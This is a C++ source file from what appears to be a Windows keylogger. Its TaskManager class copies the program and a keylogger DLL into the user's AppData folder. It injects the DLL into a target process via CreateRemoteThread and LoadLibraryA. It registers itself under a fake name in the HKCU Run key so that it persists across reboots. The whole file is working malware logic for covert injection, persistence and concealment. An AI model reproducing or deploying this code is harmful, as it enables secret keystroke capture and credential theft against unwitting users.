#include "stdafx.h"
#include <Windows.h>

#include "Process.h"
#include "TaskManager.h"

#include <shlobj.h>
#include <iostream>
#include <fstream>

TaskManager::TaskManager()
{

}

TaskManager::~TaskManager()
{

}

const std::string 		TaskManager::getKeylogDllPath() const
{
	TCHAR				buffer[MAX_DPATH];
	std::string			path;

	GetModuleFileName(NULL, buffer, MAX_DPATH);
	std::string::size_type pos = std::string(buffer).find_last_of("\\/");
	path = std::string(buffer).substr(0, pos);
	path += std::string("\\") + std::string(DLL_NAME);
	return (path);
}

const Process &			TaskManager::getProcess() const
{
	return (process);
}

const std::string 		TaskManager::getDestPath() const
{
	TCHAR				szPathAppData[MAX_PATH];
	std::string			destPath;

	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, szPathAppData)))
	{
		destPath = std::string(szPathAppData);
		destPath += "\\";
	}
	else
		destPath = std::string("C:/");

	if (CreateDirectory((destPath + std::string(DIR_NAME)).c_str(), NULL) ||
		ERROR_ALREADY_EXISTS == GetLastError())
		destPath += std::string(DIR_NAME) + std::string("\\");
	return (destPath);
}

bool				TaskManager::isInjected() const
{
	if (process.getProcessIdByProcessName(PROG_NAME) == 0)
		return (true);
	return (false);
}

bool				TaskManager::injectDll(const std::string & dllPath, unsigned int processId) const
{
	HANDLE			hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processId);

	if (hTargetProcess)
	{
		LPVOID LoadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
		LPVOID LoadPath = VirtualAllocEx(hTargetProcess, NULL, dllPath.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		WriteProcessMemory(hTargetProcess, LoadPath, dllPath.c_str(), dllPath.size(), NULL);
		HANDLE RemoteThread = CreateRemoteThread(hTargetProcess, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibAddr, LoadPath, 0, 0);

		if (RemoteThread)
			return (true);
		return (false);
	}
	return (false);
}

void			TaskManager::autoStart() const
{
	std::string path;
	HKEY		hKey;

	path = this->getDestPath() + PROG_NAME;
	RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
	if (RegQueryValueExA(hKey, FAKE_NAME, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
		RegSetValueEx(hKey, FAKE_NAME, 0, REG_SZ, (LPBYTE)path.c_str(), (DWORD)path.size());
	RegCloseKey(hKey);
}

void			TaskManager::copyProgram() const
{
	TCHAR		szPath[MAX_DPATH];
	std::string destPath;

	GetModuleFileName(NULL, szPath, MAX_DPATH);
	destPath = this->getDestPath();

	std::ifstream srcExe(szPath, std::ios::binary);
	std::ofstream destExe(destPath + PROG_NAME, std::ios::binary);
	destExe << srcExe.rdbuf();

	std::ifstream srcDll(this->getKeylogDllPath(), std::ios::binary);
	std::ofstream destDll(destPath + DLL_NAME, std::ios::binary);
	destDll << srcDll.rdbuf();
}

bool				TaskManager::hide(const std::string & processName) const
{
	std::string		dll(this->getKeylogDllPath());
	unsigned int	pid = process.getProcessIdByProcessName(processName);
	bool			ret = false;

	this->copyProgram();
	if (pid)
	{
		ret = this->injectDll(dll, pid);
	}
	return (ret);
}

bool			TaskManager::run()
{
	if (!this->isInjected())
	{
		if (!this->hide(TARGET_NAME))
			return (false);
	}
	else
		this->autoStart();
	return (true);
}